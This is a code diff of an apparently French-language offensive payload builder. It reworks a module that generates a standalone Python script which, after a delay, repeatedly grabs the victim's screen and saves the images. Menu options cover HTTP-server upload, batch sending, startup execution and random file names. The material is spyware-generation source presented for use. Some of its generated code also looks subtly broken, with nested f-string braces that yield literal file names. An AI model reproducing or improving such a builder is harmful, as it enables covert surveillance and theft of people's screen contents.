@@ -44,9 +44,7 @@ def screenshot_module():
     clear()
     affichage_screenshot()
     choix = {
-        "Cible de capture": None,
-        "Mode de capture": None,
-        "Intervalle de capture": None,
+        "Intervalle de capture": 300,
         "Nombre maximum de captures": None,
         "Délai avant première capture": 0,
         "Sauvegarde locale": None,
@@ -58,11 +56,6 @@ def screenshot_module():
         "Nom de fichier aléatoire": None,
     }
 
-    def cible_capture_option():
-        clear()
-        cible = input("Entrez la cible de capture (principal / tous / n°) : ")
-        choix["Cible de capture"] = cible
-
     def mode_capture_option():
         clear()
         mode = input("Entrez le mode de capture (unique / périodique / démarrage) : ")
@@ -70,7 +63,7 @@ def screenshot_module():
 
     def intervalle_capture_option():
         clear()
-        intervalle = input("Entrez l'intervalle de capture en secondes ('random' pour aléatoire) : ")
+        intervalle = input("Entrez l'intervalle de capture en secondes ('random' pour aléatoire) (5 minutes par défaut): ")
         choix["Intervalle de capture"] = intervalle
 
     def nombre_max_captures_option():
@@ -100,11 +93,16 @@ def screenshot_module():
         http = input("Entrez l'URL du serveur HTTP : ")
         choix["Envoi sur serveur HTTP"] = http
         controle()
-        
+
     def mode_envoi_option():
         clear()
-        mode = input("Entrez le mode d'envoi (une seule / multiple) : ")
-        choix["Mode envoi"] = mode
+        mode = input("Voulez-vous envoyer les captures au bout de combien de capture : ")
+        try:
+            choix["Mode envoi"] = int(mode)
+        except ValueError:
+            print(Fore.RED + "Veuillez entrer un nombre valide." + Style.RESET_ALL)
+            time.sleep(2)
+            choix["Mode envoi"] = None
 
     def activer_logs_option():
         clear()
@@ -148,23 +146,40 @@ def screenshot_module():
         clear()
         print(Fore.GREEN + "Création du payload Screenshot avec la configuration suivante :" + Style.RESET_ALL)
         filename = f"screenshot_payload{choix['Nom de fichier aléatoire']}"
+        
+        sauvegarde_code = ""
+        if choix['Sauvegarde locale']:
+            sauvegarde_code = f"            image.save(os.path.join(r'{choix['Sauvegarde locale']}', f'screenshot_{{{{int(time.time())}}}}.png'))"
+        
+        code = f"""
+import time
+import os
+from PIL import ImageGrab
+import requests
+import random
+import io
+
+def take_screenshot():
+    try:
+        time.sleep({choix['Délai avant première capture']})
+        for _ in range({choix['Nombre maximum de captures']}):
+            image = ImageGrab.grab()
+            buffer = io.BytesIO()
+            image.save(buffer, format="PNG")
+            buffer.seek(0)
+{sauvegarde_code}
+            time.sleep({choix['Intervalle de capture']})
+    except Exception as e:
+        print(f"Erreur lors de la capture d'écran : {{{{e}}}}")
+        return None
+
+take_screenshot()
+"""
+        
         with open(filename, "w") as f:
-            f.write("import time\n")
-            f.write("from PIL import ImageGrab\n")
-            f.write("import os\n")
-            f.write("import datetime\n")
-            f.write("import random\n")
-            f.write("import requests\n\n")
-            f.write("def take_screenshot():\n")
-            f.write("    time.sleep(" + str(choix["Délai avant première capture"]) + ")\n")
-            f.write("    for i in range(" + str(choix["Nombre maximum de captures"]) + "):\n")
-            f.write("        ")
-            f.write("        screenshot = ImageGrab.grab()\n")
-            f.write("        timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')\n")
-            f.write("        filename = f'screenshot_' + timestamp + '.png'\n")
-            f.write("        time.sleep(" + (str(choix["Intervalle de capture"]) if choix["Intervalle de capture"] != "random" else "random.randint(5, 15)") + ")\n")
-            if choix["Sauvegarde locale"]:
-                f.write("        screenshot.save(os.path.join('" + choix["Sauvegarde locale"] + "', filename))\n")
+            f.write(code)
+        
+        print(Fore.GREEN + f"Payload créé : {filename}" + Style.RESET_ALL)
 
     while True:
         cmd = input(Fore.GREEN + ">> " + Style.RESET_ALL)
